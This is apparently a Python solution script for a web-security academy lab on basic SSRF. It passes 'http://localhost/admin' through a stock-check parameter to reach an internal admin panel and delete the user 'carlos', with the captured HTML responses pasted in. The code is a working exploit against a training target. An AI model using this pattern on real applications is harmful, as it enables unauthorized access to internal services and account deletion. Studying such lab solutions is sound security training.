# Lab: Basic SSRF against the local server

import requests

base = "https://0ac600f504d6859e824c013a003800c0.web-security-academy.net"
s=requests.Session()

print("===========[step1] Access to admin page===============")
page_admin=s.get(f"{base}/admin")
print(page_admin.text)

'''
                    Admin interface only available if logged in as an administrator, or if requested from loopback
'''

print("===========[step2] Access Product Page===============")
page_product=s.get(f"{base}/product", params={"productId":"5"})
print(page_product.text)

'''
                        <form id="stockCheckForm" action="/product/stock" method="POST">
                            <select name="stockApi">
                                <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=1">London</option>
                                <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=2">Paris</option>
                                <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=3">Milan</option>
                            </select>
                            <button type="submit" class="button">Check stock</button>
                        </form>
                        <span id="stockCheckResult"></span>
                        <script src="/resources/js/stockCheckPayload.js"></script>
                        <script src="/resources/js/stockCheck.js"></script>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
'''

print("===========[step3] Check stock===============")
page_stock = s.post(f"{base}/product/stock",
                    data={"stockApi": "http://stock.weliketoshop.net:8080/product/stock/check?productId=5&storeId=1"})
print(page_stock.text)   # returns numbers => 91

print("===========[step4] Access Admin Page with stockapi===============")
admin_url=f"{base}/admin"
page_stock_admin = s.post(f"{base}/product/stock",
                    data={"stockApi": admin_url})
print(page_stock_admin.text)   # Admin interface only available if logged in as an administrator, or if requested from loopback

print("===========[step4-1] Access loop Admin Page with stockapi===============")
admin_loop_url=f"http://localhost/admin"
page_stock_admin_loop = s.post(f"{base}/product/stock",
                    data={"stockApi": admin_loop_url})
print(page_stock_admin_loop.text)   # Bingo!

'''
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
'''

print("===========[step5] Delete Carlos Account===============")
#page_delete_carlos=s.get(f"{base}/admin/delete", params={"username":"carlos"}) 
# Even you get admin page you can't use above code, becaude still your session is not admin session

delete_carlos=f"http://localhost/admin/delete?username=carlos"
page_delete_stockapi = s.post(f"{base}/product/stock",
                    data={"stockApi": delete_carlos})
print(page_delete_stockapi.text)   # user "carlos" successfully deleted??
